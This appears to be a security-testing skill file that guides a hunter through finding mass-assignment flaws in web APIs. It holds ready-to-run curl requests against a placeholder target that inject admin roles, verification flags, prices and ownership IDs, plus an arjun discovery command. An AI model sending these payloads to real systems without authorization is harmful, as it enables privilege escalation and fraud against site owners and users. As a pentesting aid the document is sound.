---
name: mass-assignment
description: >
  Hunt for mass assignment: binding user-supplied JSON/form fields
  directly onto ORM models or DTOs without an explicit allow-list, letting
  attackers set hidden/protected fields (isAdmin, role, balance,
  verified, price) that the UI never exposes. Use on any create/update
  endpoint (profile, registration, order, settings) backed by an ORM or
  auto-binding framework. Keywords: mass assignment, over-posting,
  isAdmin, role field, hidden parameter, autobinding, ActiveRecord,
  Mongoose, Django ModelForm.
  Do NOT use for the broader API authorization survey (BOLA/BFLA) — use
  api-abuse for that; this skill is specifically about extra/hidden
  fields accepted on otherwise-authorized requests.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-915]
  mitre_attack: [T1548]
  tools: [burpsuite, curl, arjun, "Autorize"]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [api-abuse, broken-access-control, business-logic]
---

## Signals

- Create/update endpoints accepting a JSON or form body with many fields (`PATCH /api/users/me`, `POST /register`, `PUT /api/orders/{id}`).
- Framework known for convenient auto-binding: Ruby on Rails (`ActiveRecord` without `strong_parameters` enforcement), Node + Mongoose (`Model.create(req.body)` / `Model.findByIdAndUpdate(id, req.body)`), Django (`ModelForm`/DRF `ModelSerializer` with `fields = '__all__'`), Spring (`@ModelAttribute`/`@RequestBody` bound directly to an entity), Laravel Eloquent without `$fillable`/`$guarded`.
- A response from a GET on the same object revealing field names not present in any form (`role`, `isAdmin`, `verified`, `credit_balance`, `plan_tier`, `discount_percent`).
- Registration flows where the account is later manually "approved"/"verified" by an admin — a sign a `verified`/`approved` boolean exists server-side.

## Prerequisites

- A full GET response of the target object to harvest real field names (`/api/users/me`, `/api/orders/{id}`).
- Two test accounts: one normal, ideally one legitimate admin account to diff field names/values the normal account should never see.

## Methodology

1. **Harvest the full field list.** Pull the GET representation of the object and list every key, including ones the UI doesn't render:
   ```bash
   curl -s https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" | jq 'keys'
   ```
   If an admin account is available for comparison, diff field sets:
   ```bash
   diff <(curl -s .../users/me -H "Authorization: Bearer $TOKEN_USER" | jq 'keys') \
        <(curl -s .../users/me -H "Authorization: Bearer $TOKEN_ADMIN" | jq 'keys')
   ```

2. **Baseline the legitimate update request**, capture it in Burp, note exactly which fields the real UI sends on a normal "save profile" action.

3. **Inject hidden/privileged fields into the same request**, one at a time first (to isolate which one sticks), then combined:
   ```bash
   curl -s -i -X PATCH https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" -d '{"name":"Test User","role":"admin"}'

   curl -s -i -X PATCH https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" -d '{"name":"Test User","isAdmin":true}'

   curl -s -i -X PATCH https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" -d '{"name":"Test User","verified":true,"email_verified":true}'
   ```

4. **Confirm the change actually persisted** with a fresh GET (don't trust the PATCH response alone, some apps echo input without actually saving it):
   ```bash
   curl -s https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" | jq '.role, .isAdmin'
   ```

5. **Test on registration/signup**, not just profile update — new-account mass assignment is often higher impact (instant privilege at account creation):
   ```bash
   curl -s -i -X POST https://target.com/api/register -H "Content-Type: application/json" \
     -d '{"email":"newattacker@test.com","password":"Test123!","role":"admin","is_staff":true}'
   ```

6. **Test on nested/relational fields.** ORMs sometimes allow mass-assigning a relation ID that changes ownership or tier:
   ```bash
   curl -s -i -X PATCH https://target.com/api/orders/1042 -H "Authorization: Bearer $TOKEN" \
     -d '{"status":"shipped","user_id":99,"total_price":0.01}'
   ```

7. **Nested object mass assignment.** Try wrapping the privileged field inside a nested object matching the ORM's association structure, in case flat-field filtering is applied but nested isn't:
   ```bash
   curl -s -i -X PATCH https://target.com/api/users/me -H "Authorization: Bearer $TOKEN" \
     -d '{"name":"Test","profile":{"role":"admin"}}'
   ```

8. **Automate field discovery** against the endpoint using known-sensitive field name wordlists:
   ```bash
   arjun -u https://target.com/api/users/me -m PATCH --headers "Authorization: Bearer $TOKEN" \
     -w sensitive_fields_wordlist.txt
   ```

## Tooling

- `curl` + `jq` for field harvesting and diffing (fastest, most reliable for this skill).
- `arjun` for scaled hidden-parameter discovery across an endpoint.
- Burp Suite **Autorize**/Repeater for manual iteration and request duplication across accounts.

## Root Causes

- ORM/framework binds the entire request body onto a model instance without an explicit allow-list (`strong_parameters`, DRF serializer `fields`, Mongoose `select`, explicit DTO mapping).
- Sensitive fields (`role`, `isAdmin`, `balance`, `verified`) live on the same model as user-editable fields, with no separation of trust boundary.
- Developer trusts that "the frontend doesn't send that field" as the only protection.

## Validation Gate (minimum proof)

- Request/response showing the mass-assignment payload, **plus** a follow-up GET confirming the field's new value actually persisted server-side — a PATCH 200 response alone is not proof of persistence.
- For privilege fields: proof the elevated privilege actually works (e.g. the now-"admin" account can access an admin-only endpoint that previously 403'd) strengthens severity from Inferred to Demonstrated.
- Always show the baseline field list pulled from the GET response to justify why that field name was tried.

## Gotchas

- **Minimum proof:** the PATCH/POST returning 200 is not enough — verify the actual field changed via an independent GET; some frameworks silently ignore unknown-but-accepted fields while still returning success.
- **Common N/A:** framework enforces an explicit allow-list (`strong_parameters`, `fields = [...]` on a DRF serializer, a hand-written DTO/mapper) — attempted injected fields simply don't appear in the follow-up GET; close as N/A after confirming with at least 2–3 distinct field name attempts (don't stop at one).
- **Overclaim trap:** a field that persists but has no security impact (e.g. a cosmetic `theme_color` you weren't supposed to set directly but doesn't matter) is not a finding worth escalating — focus on privilege/financial/trust fields.
- Some apps validate field *values* but not field *presence* (e.g. reject `role: "superadmin"` but accept `role: "admin"` because that's a technically-valid enum value just not meant to be user-settable) — test the full range of valid enum values, not just the most obviously dangerous one.
- Don't forget PUT vs PATCH vs POST can be bound differently in the same framework — test all verbs the endpoint accepts.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Privilege field injection** — Can you set a privileged field (isAdmin, role, verified) that isn't exposed in the intended form?
2. **Price/quantity tampering** — Can you inject fields controlling price, discount, or balance that the client-facing form doesn't expose?
3. **Cross-object injection** — Can you set foreign-key/ownership fields (userId, orgId) to reassign a resource to another entity?
4. **Consistency across endpoints** — Does the same unfiltered-bind pattern exist on related create/update endpoints?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Mass assignment of `role`/`isAdmin` → direct privilege escalation, chain with broken-access-control to demonstrate downstream admin-only access.
- Mass assignment of `price`/`discount_percent`/`quantity` fields → chain fully into business-logic for the financial-impact writeup.
- Mass assignment discovered via the broader API survey → cross-reference api-abuse where this was the entry point.
- Mass assignment via nested object bypassing flat-field filtering → relevant if the app also has a prototype-pollution-style merge utility; check if the same gadget applies.
